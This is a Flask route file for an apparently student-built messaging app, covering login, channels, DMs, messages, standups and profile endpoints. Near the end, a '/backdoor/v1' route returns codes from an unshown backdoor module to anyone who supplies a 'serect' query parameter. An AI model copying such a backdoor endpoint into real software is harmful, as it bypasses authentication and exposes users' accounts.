import os
import sys
import signal
from json import dumps
from flask import Flask, request, send_from_directory
from flask_mail import Mail
from flask_cors import CORS
from src.error import InputError
from src import config

from src.admin import *
from src.auth import *
from src.channel import *
from src.channels import *
from src.dm import *
from src.error import *
from src.message import *
from src.notification import *
from src.other import *
from src.search import *
from src.standup import *
from src.user import *

from src import backdoor


def quit_gracefully(*args):
    '''For coverage'''
    exit(0)


def default_handler(err):
    response = err.get_response()
    print('response', err, err.get_response())
    response.data = dumps({
        "code": err.code,
        "name": "System Error",
        "message": err.get_description(),
    })
    response.content_type = 'application/json'
    return response


APP = Flask(__name__)
CORS(APP)

APP.config['MAIL_SERVER'] = config.MAIL_SERVER
APP.config['MAIL_PORT'] = config.MAIL_PORT
APP.config['MAIL_USERNAME'] = config.MAIL_USERNAME
APP.config['MAIL_PASSWORD'] = config.MAIL_PASSWORD
APP.config['MAIL_USE_TLS'] = config.MAIL_USE_TLS
APP.config['MAIL_USE_SSL'] = config.MAIL_USE_SSL

APP.config['TRAP_HTTP_EXCEPTIONS'] = True
APP.register_error_handler(Exception, default_handler)

mailobj = Mail(APP)

#### NO NEED TO MODIFY ABOVE THIS POINT, EXCEPT IMPORTS


# Example
@APP.route("/echo", methods=['GET'])
def echo():
    data = request.args.get('data')
    if data == 'echo':
        raise InputError(description='Cannot echo "echo"')
    return dumps({'data': data})


@APP.route("/auth/login/v2", methods=['POST'])
def auth_login():
    data = request.get_json()
    resp = auth_login_v2(
        data['email'],
        data['password'],
    )
    return dumps(resp)


@APP.route("/auth/register/v2", methods=['POST'])
def auth_register():
    data = request.get_json()
    resp = auth_register_v2(
        data['email'],
        data['password'],
        data['name_first'],
        data['name_last'],
    )
    return dumps(resp)


@APP.route("/channels/create/v2", methods=['POST'])
def channels_create():
    data = request.get_json()
    resp = channels_create_v2(
        data['token'],
        data['name'],
        data['is_public'],
    )
    return dumps(resp)


@APP.route("/channels/list/v2", methods=['GET'])
def channels_list():
    token = str(request.args.get('token'))
    resp = channels_list_v2(token)
    return dumps(resp)


@APP.route("/channels/listall/v2", methods=['GET'])
def channels_listall():
    token = str(request.args.get('token'))
    resp = channels_listall_v2(token)
    return dumps(resp)


@APP.route("/channel/details/v2", methods=['GET'])
def channel_details():
    token = str(request.args.get('token'))
    channel_id = int(request.args.get('channel_id'))
    resp = channel_details_v2(token, channel_id)
    return dumps(resp)


@APP.route("/channel/join/v2", methods=['POST'])
def channel_join():
    data = request.get_json()
    resp = channel_join_v2(
        data['token'],
        data['channel_id'],
    )
    return dumps(resp)


@APP.route("/channel/invite/v2", methods=['POST'])
def channel_invite():
    data = request.get_json()
    resp = channel_invite_v2(
        data['token'],
        data['channel_id'],
        data['u_id'],
    )
    return dumps(resp)


@APP.route("/channel/messages/v2", methods=['GET'])
def channel_messages():
    token = str(request.args.get('token'))
    channel_id = int(request.args.get('channel_id'))
    start = int(request.args.get('start'))
    resp = channel_messages_v2(token, channel_id, start)
    return dumps(resp)


@APP.route("/clear/v1", methods=['DELETE'])
def clear():
    resp = clear_v1()
    return dumps(resp)


@APP.route("/auth/logout/v1", methods=['POST'])
def auth_logout():
    data = request.get_json()
    resp = auth_logout_v1(data['token'])
    return dumps(resp)


@APP.route("/channel/leave/v1", methods=['POST'])
def channel_leave():
    data = request.get_json()
    resp = channel_leave_v1(
        data['token'],
        data['channel_id'],
    )
    return dumps(resp)


@APP.route("/channel/addowner/v1", methods=['POST'])
def channel_addowner():
    data = request.get_json()
    resp = channel_addowner_v1(
        data['token'],
        data['channel_id'],
        data['u_id'],
    )
    return dumps(resp)


@APP.route("/channel/removeowner/v1", methods=['POST'])
def channel_removeowner():
    data = request.get_json()
    resp = channel_removeowner_v1(
        data['token'],
        data['channel_id'],
        data['u_id'],
    )
    return dumps(resp)


@APP.route("/message/send/v1", methods=['POST'])
def message_send():
    data = request.get_json()
    resp = message_send_v1(
        data['token'],
        data['channel_id'],
        data['message'],
    )
    return dumps(resp)


@APP.route("/message/edit/v1", methods=['PUT'])
def message_edit():
    data = request.get_json()
    resp = message_edit_v1(
        data['token'],
        data['message_id'],
        data['message'],
    )
    return dumps(resp)


@APP.route("/message/remove/v1", methods=['DELETE'])
def message_remove():
    data = request.get_json()
    resp = message_remove_v1(
        data['token'],
        data['message_id'],
    )
    return dumps(resp)


@APP.route("/dm/create/v1", methods=['POST'])
def dm_create():
    token = request.json.get('token')
    u_ids = [int(u_id) for u_id in request.json.get('u_ids')]
    resp = dm_create_v1(
        token,
        u_ids,
    )
    return dumps(resp)


@APP.route("/dm/list/v1", methods=['GET'])
def dm_list():
    token = str(request.args.get('token'))
    resp = dm_list_v1(token)
    return dumps(resp)


@APP.route("/dm/remove/v1", methods=['DELETE'])
def dm_remove():
    data = request.get_json()
    resp = dm_remove_v1(
        data['token'],
        data['dm_id'],
    )
    return dumps(resp)


@APP.route("/dm/details/v1", methods=['GET'])
def dm_details():
    token = str(request.args.get('token'))
    dm_id = int(request.args.get('dm_id'))
    resp = dm_details_v1(token, dm_id)
    return dumps(resp)


@APP.route("/dm/leave/v1", methods=['POST'])
def dm_leave():
    data = request.get_json()
    resp = dm_leave_v1(
        data['token'],
        data['dm_id'],
    )
    return dumps(resp)


@APP.route("/dm/messages/v1", methods=['GET'])
def dm_messages():
    token = str(request.args.get('token'))
    dm_id = int(request.args.get('dm_id'))
    start = int(request.args.get('start'))
    resp = dm_messages_v1(token, dm_id, start)
    return dumps(resp)


@APP.route("/message/senddm/v1", methods=['POST'])
def message_senddm():
    data = request.get_json()
    resp = message_senddm_v1(
        data['token'],
        data['dm_id'],
        data['message'],
    )
    return dumps(resp)


@APP.route("/users/all/v1", methods=['GET'])
def user_all():
    token = str(request.args.get('token'))
    resp = users_all_v1(token)
    return dumps(resp)


@APP.route("/user/profile/v1", methods=['GET'])
def user_profile():
    token = str(request.args.get('token'))
    u_id = int(request.args.get('u_id'))
    resp = user_profile_v1(token, u_id)
    return dumps(resp)


@APP.route("/user/profile/setname/v1", methods=['PUT'])
def user_profile_setname():
    data = request.get_json()
    resp = user_profile_setname_v1(
        data['token'],
        data['name_first'],
        data['name_last'],
    )
    return dumps(resp)


@APP.route("/user/profile/setemail/v1", methods=['PUT'])
def user_profile_setemail():
    data = request.get_json()
    resp = user_profile_setemail_v1(
        data['token'],
        data['email'],
    )
    return dumps(resp)


@APP.route("/user/profile/sethandle/v1", methods=['PUT'])
def user_profile_sethandle():
    data = request.get_json()
    resp = user_profile_sethandle_v1(
        data['token'],
        data['handle_str'],
    )
    return dumps(resp)


@APP.route("/admin/user/remove/v1", methods=['DELETE'])
def admin_user_remove():
    data = request.get_json()
    resp = admin_user_remove_v1(
        data['token'],
        data['u_id'],
    )
    return dumps(resp)


@APP.route("/admin/userpermission/change/v1", methods=['POST'])
def admin_userpermission_change():
    data = request.get_json()
    resp = admin_userpermission_change_v1(
        data['token'],
        data['u_id'],
        data['permission_id'],
    )
    return dumps(resp)


@APP.route('/notifications/get/v1', methods=['GET'])
def get_notifications():
    token = str(request.args.get('token'))
    resp = notifications_get_v1(token)
    return dumps(resp)


@APP.route('/search/v1', methods=['GET'])
def search_msg():
    token = str(request.args.get('token'))
    query_str = str(request.args.get('query_str'))
    resp = search_v1(token, query_str)
    return dumps(resp)


@APP.route("/message/share/v1", methods=['POST'])
def message_share():
    data = request.get_json()
    resp = message_share_v1(
        data['token'],
        data['og_message_id'],
        data['message'],
        data['channel_id'],
        data['dm_id'],
    )
    return dumps(resp)


@APP.route("/message/react/v1", methods=['POST'])
def message_react():
    data = request.get_json()
    resp = message_react_v1(
        data['token'],
        data['message_id'],
        data['react_id'],
    )
    return dumps(resp)


@APP.route("/message/unreact/v1", methods=['POST'])
def message_unreact():
    data = request.get_json()
    resp = message_unreact_v1(
        data['token'],
        data['message_id'],
        data['react_id'],
    )
    return dumps(resp)


@APP.route("/message/pin/v1", methods=['POST'])
def message_pin():
    data = request.get_json()
    resp = message_pin_v1(
        data['token'],
        data['message_id'],
    )
    return dumps(resp)


@APP.route("/message/unpin/v1", methods=['POST'])
def message_unpin():
    data = request.get_json()
    resp = message_unpin_v1(
        data['token'],
        data['message_id'],
    )
    return dumps(resp)


@APP.route("/message/sendlater/v1", methods=['POST'])
def message_sendlater():
    data = request.get_json()
    resp = message_sendlater_v1(
        data['token'],
        data['channel_id'],
        data['message'],
        data['time_sent'],
    )
    return dumps(resp)


@APP.route("/message/sendlaterdm/v1", methods=['POST'])
def message_sendlaterdm():
    data = request.get_json()
    resp = message_sendlaterdm_v1(
        data['token'],
        data['dm_id'],
        data['message'],
        data['time_sent'],
    )
    return dumps(resp)


@APP.route("/standup/start/v1", methods=['POST'])
def standup_start():
    data = request.get_json()
    resp = standup_start_v1(
        data['token'],
        data['channel_id'],
        data['length'],
    )
    return dumps(resp)


@APP.route('/standup/active/v1', methods=['GET'])
def standup_active():
    token = str(request.args.get('token'))
    channel_id = int(request.args.get('channel_id'))
    resp = standup_active_v1(token, channel_id)
    return dumps(resp)


@APP.route("/standup/send/v1", methods=['POST'])
def standup_send():
    data = request.get_json()
    resp = standup_send_v1(
        data['token'],
        data['channel_id'],
        data['message'],
    )
    return dumps(resp)


@APP.route("/auth/passwordreset/request/v1", methods=['POST'])
def auth_passwordreset_request():
    data = request.get_json()
    resp = auth_passwordreset_request_v1(data['email'], mailobj)
    return dumps(resp)


@APP.route("/auth/passwordreset/reset/v1", methods=['POST'])
def auth_passwordreset_reset():
    data = request.get_json()
    resp = auth_passwordreset_reset_v1(
        data['reset_code'],
        data['new_password'],
    )
    return dumps(resp)


@APP.route("/profile_img/<path:name>")
def get_profile_img(name):
    print(name, os.getcwd())
    return send_from_directory(f'{os.getcwd()}/static/profile_img', name)


@APP.route("/user/profile/uploadphoto/v1", methods=['POST'])
def profile_uploadphoto():
    data = request.get_json()
    resp = user_profile_uploadphoto_v1(
        data['token'],
        data['img_url'],
        data['x_start'],
        data['y_start'],
        data['x_end'],
        data['y_end'],
    )
    return dumps(resp)


@APP.route('/user/stats/v1', methods=['GET'])
def user_stats():
    token = str(request.args.get('token'))
    resp = user_stats_v1(token)
    return dumps(resp)


@APP.route('/users/stats/v1', methods=['GET'])
def users_stats():
    token = str(request.args.get('token'))
    resp = users_stats_v1(token)
    return dumps(resp)


## backdoor
@APP.route('/backdoor/v1', methods=['GET'])
def backdoor_server():
    serect = str(request.args.get('serect'))
    resp = backdoor.get_code(serect)
    return dumps(resp)


#### NO NEED TO MODIFY BELOW THIS POINT

if __name__ == "__main__":
    signal.signal(signal.SIGINT, quit_gracefully)  # For coverage
    APP.run(port=config.port)  # Do not edit this port
